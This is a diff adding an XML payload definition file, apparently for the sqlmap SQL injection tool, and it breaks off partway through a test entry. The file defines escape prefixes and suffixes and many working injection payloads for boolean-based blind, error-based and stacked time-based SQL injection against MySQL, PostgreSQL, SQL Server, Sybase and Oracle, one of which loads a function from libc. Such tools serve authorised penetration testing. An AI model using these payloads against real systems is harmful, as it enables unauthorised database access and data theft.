@@ -1,0 +1,1290 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!--
+Tag: <boundary>
+    How to prepend and append to the test ' <payload><comment> ' string.
+
+    Sub-tag: <level>
+        From which level check for this test.
+
+        Valid values:
+            1: Always (<100 requests)
+            2: Try a bit harder (100-200 requests)
+            3: Good number of requests (200-500 requests)
+            4: Extensive test (500-1000 requests)
+            5: You have plenty of time (>1000 requests)
+
+    Sub-tag: <clause>
+        In which clause the payload can work.
+
+        NOTE: for instance, there are some payload that do not have to be
+        tested as soon as it has been identified whether or not the
+        injection is within a WHERE clause condition.
+
+        Valid values:
+            0: Always
+            1: WHERE
+            2: GROUP BY
+            3: ORDER BY
+            4: LIMIT
+            5: OFFSET
+            6: TOP
+            7: Table name
+            8: Column name
+
+        A comma separated list of these values is also possible.
+
+    Sub-tag: <where>
+        This depends on the <where> value of the <test> (payload) in exam.
+
+        Valid values:
+            1: When the value of <test>'s <where> is 1.
+            2: When the value of <test>'s <where> is 2.
+            3: When the value of <test>'s <where> is 3.
+
+        A comma separated list of these values is also possible.
+
+    Sub-tag: <ptype>
+        What is the parameter value type.
+
+        Valid values:
+            1: Unescaped numeric
+            2: Single quoted string
+            3: LIKE single quoted string
+            4: Double quoted string
+            5: LIKE double quoted string
+
+    Sub-tag: <prefix>
+        A string to prepend to the payload.
+
+    Sub-tag: <suffix>
+        A string to append to the payload.
+
+
+Tag: <test>
+    SQL injection test definition.
+
+    Sub-tag: <title>
+        Title of the test.
+
+    Sub-tag: <stype>
+        SQL injection family type.
+
+        Valid values:
+            0: Heuristic check to parse response errors
+            1: Boolean-based blind SQL injection
+            2: Error-based SQL injection
+            3: UNION query SQL injection
+            4: Stacked queries SQL injection
+            5: AND/OR time-based blind SQL injection
+
+    Sub-tag: <level>
+        From which level check for this test.
+
+        Valid values:
+            1: Always (<100 requests)
+            2: Try a bit harder (100-200 requests)
+            3: Good number of requests (200-500 requests)
+            4: Extensive test (500-1000 requests)
+            5: You have plenty of time (>1000 requests)
+
+    Sub-tag: <risk>
+        Likelihood of a payload to damage the data integrity.
+
+        Valid values:
+            0: No risk
+            1: Low risk
+            2: Medium risk
+            3: High risk
+
+    Sub-tag: <clause>
+        In which clause the payload can work.
+
+        NOTE: for instance, there are some payload that do not have to be
+        tested as soon as it has been identified whether or not the
+        injection is within a WHERE clause condition.
+
+        Valid values:
+            0: Always
+            1: WHERE
+            2: GROUP BY
+            3: ORDER BY
+            4: LIMIT
+            5: OFFSET
+            6: TOP
+            7: Table name
+            8: Column name
+
+        A comma separated list of these values is also possible.
+
+    Sub-tag: <where>
+        Where to add our '<prefix> <payload><comment> <suffix>' string.
+
+        Valid values:
+            1: Append to the parameter original value
+            2: Append to the parameter original value and change the
+               original value to its negative representation
+            3: Replace the parameter original value
+
+    Sub-tag: <request>
+        What to inject for this test.
+
+        Sub-tag: <payload>
+            The payload to test for.
+
+        Sub-tag: <comment>
+            Comment to append to the payload, before the suffix.
+
+    Sub-tag: <response>
+        How to identify if the injected payload succeeded.
+
+        Sub-tag: <comparison>
+            Perform a request with this string as the payload and compare
+            the response with the <payload> response. Apply the comparison
+            algorithm.
+
+            NOTE: useful to test for boolean-based blind SQL injections.
+
+        Sub-tag: <grep>
+            Regular expression to grep for in the response body.
+
+            NOTE: useful to test for error-based and UNION query SQL
+            injections.
+
+        Sub-tag: <time>
+            Time in seconds to wait before the response is returned.
+
+            NOTE: useful to test for time-based blind and stacked queries
+            SQL injections.
+
+    Sub-tag: <details>
+        Which details can be infered if the payload succeed.
+
+        Sub-tags: <dbms>
+            What is the database management system (e.g. MySQL).
+
+        Sub-tags: <dbms_version>
+            What is the database management system version (e.g. 5.0.51).
+
+        Sub-tags:  <os>
+            What is the database management system underlying operating
+            system.
+
+Formats:
+    <boundary>
+        <level></level>
+        <clause></clause>
+        <where></where>
+        <ptype></ptype>
+        <prefix></prefix>
+        <suffix></suffix>
+    </boundary>
+
+    <test>
+        <title></title>
+        <stype></stype>
+        <level></level>
+        <risk></risk>
+        <clause></clause>
+        <where></where>
+        <request>
+            <payload></payload>
+            <comment></comment>
+        </request>
+        <response>
+            <comparison></comparison>
+            <grep></grep>
+            <time></time>
+        </response>
+        <details>
+            <dbms></dbms>
+            <dbms_version></dbms_version>
+            <os></os>
+        </details>
+    </test>
+-->
+
+<root>
+    <boundary>
+        <level>1</level>
+        <clause>0</clause>
+        <where>1,2,3</where>
+        <ptype>1</ptype>
+        <prefix></prefix>
+        <suffix></suffix>
+    </boundary>
+
+    <boundary>
+        <level>1</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>)</prefix>
+        <suffix>AND ([RANDNUM]=[RANDNUM]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>))</prefix>
+        <suffix>AND (([RANDNUM]=[RANDNUM]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>)))</prefix>
+        <suffix>AND ((([RANDNUM]=[RANDNUM]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>1</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>'</prefix>
+        <suffix>AND '[RANDSTR]'='[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>1</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>')</prefix>
+        <suffix>AND ('[RANDSTR]'='[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>'))</prefix>
+        <suffix>AND (('[RANDSTR]'='[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>')))</prefix>
+        <suffix>AND ((('[RANDSTR]'='[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>'</prefix>
+        <suffix>AND '[RANDSTR]' LIKE '[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>')</prefix>
+        <suffix>AND ('[RANDSTR]' LIKE '[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>'))</prefix>
+        <suffix>AND (('[RANDSTR]' LIKE '[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>')))</prefix>
+        <suffix>AND ((('[RANDSTR]' LIKE '[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>"</prefix>
+        <suffix>AND "[RANDSTR]"="[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>")</prefix>
+        <suffix>AND ("[RANDSTR]"="[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>4</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>"))</prefix>
+        <suffix>AND (("[RANDSTR]"="[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>4</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>")))</prefix>
+        <suffix>AND ((("[RANDSTR]"="[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>"</prefix>
+        <suffix>AND "[RANDSTR]" LIKE "[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>4</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>")</prefix>
+        <suffix>AND ("[RANDSTR]" LIKE "[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>"))</prefix>
+        <suffix>AND (("[RANDSTR]" LIKE "[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>")))</prefix>
+        <suffix>AND ((("[RANDSTR]" LIKE "[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>2,3</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>,</prefix>
+        <suffix></suffix>
+    </boundary>
+
+
+    <!-- Boolean-based blind tests - WHERE clause -->
+    <test>
+        <title>AND boolean-based blind - WHERE clause</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+    <!-- End of boolean-based blind tests - WHERE clause -->
+
+
+    <!-- Boolean-based blind tests - GROUP BY and ORDER BY clauses -->
+    <test>
+        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle boolean-based blind - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END) FROM DUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <!-- TODO: check against Microsoft Access, Firebird and SAP MaxDB -->
+    <!-- NOTE: this does not behave as expected against SQLite, need to find another payload (TODO) -->
+    <test>
+        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END))</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>3</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>3</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>3</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle boolean-based blind - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>3</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END) FROM DUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <!-- TODO: check against Microsoft Access, Firebird and SAP MaxDB -->
+    <!-- NOTE: this does not behave as expected against SQLite, need to find another payload (TODO) -->
+    <test>
+        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>3</where>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END))</comparison>
+        </response>
+    </test>
+    <!-- End of boolean-based blind tests - GROUP BY and ORDER BY clauses -->
+
+
+    <!-- Error-based tests - WHERE clause -->
+    <test>
+        <title>MySQL &gt;= 5.0 error-based - WHERE clause</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[ERROR_START_CHAR]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[ERROR_END_CHAR]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - WHERE clause</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND [RANDNUM]=CAST('[ERROR_START_CHAR]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[ERROR_END_CHAR]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - WHERE clause</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND [RANDNUM]=CONVERT(INT,('[ERROR_START_CHAR]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[ERROR_END_CHAR]'))</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle error-based - WHERE clause</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[ERROR_START_CHAR]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[ERROR_END_CHAR]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <!--
+         TODO: if possible, add payload for SQLite, Microsoft Access,
+         Firebird and SAP MaxDB - no known techniques at this time
+    -->
+    <!-- End of error-based tests - WHERE clause -->
+
+
+    <!-- Error-based tests - GROUP BY and ORDER BY clauses -->
+    <test>
+        <title>MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[ERROR_START_CHAR]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[ERROR_END_CHAR]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - GROUP BY and ORDER BY clauses</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>(CAST('[ERROR_START_CHAR]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[ERROR_END_CHAR]' AS NUMERIC))</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <request>
+            <payload>(CONVERT(INT,('[ERROR_START_CHAR]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[ERROR_END_CHAR]')))</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <request>
+            <payload>(SELECT UPPER(XMLType(CHR(60)||'[ERROR_START_CHAR]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[ERROR_END_CHAR]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>3</where>
+        <request>
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[ERROR_START_CHAR]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[ERROR_END_CHAR]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - GROUP BY and ORDER BY clauses</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>3</where>
+        <request>
+            <payload>(CAST('[ERROR_START_CHAR]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[ERROR_END_CHAR]' AS NUMERIC))</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>3</clause>
+        <where>3</where>
+        <request>
+            <payload>(CONVERT(INT,('[ERROR_START_CHAR]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[ERROR_END_CHAR]')))</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>3</clause>
+        <where>3</where>
+        <request>
+            <payload>(SELECT UPPER(XMLType(CHR(60)||'[ERROR_START_CHAR]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[ERROR_END_CHAR]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <!--
+         TODO: if possible, add payload for SQLite, Microsoft Access,
+         Firebird and SAP MaxDB - no known techniques at this time
+    -->
+    <!-- End of error-based tests - GROUP BY and ORDER BY clauses -->
+
+
+    <!-- UNION query tests -->
+
+    <!-- TODO: Think about proper structure for this -->
+    <!-- End of UNION query tests -->
+
+    <!-- Stacked queries tests -->
+    <test>
+        <title>MySQL &gt; 5.0.11 stacked queries</title>
+        <stype>4</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; SELECT SLEEP([SLEEPTIME]);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 stacked queries</title>
+        <stype>4</stype>
+        <level>2</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; SELECT BENCHMARK(5000000, MD5('[SLEEPTIME]'));</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 stacked queries</title>
+        <stype>4</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; SELECT PG_SLEEP([SLEEPTIME]);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &lt; 8.2 stacked queries - exists function</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; SELECT 'sqlmap' WHERE exists(SELECT * FROM generate_series(1, 3000000));</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&lt; 8.2</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &lt; 8.2 stacked queries - Glibc</title>
+        <stype>4</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME]);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&lt; 8.2</dbms_version>
+            <os>Linux</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase stacked queries</title>
+        <stype>4</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; WAITFOR DELAY '0:0:[SLEEPTIME]';</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle stacked queries</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle stacked queries</title>
+        <stype>4</stype>
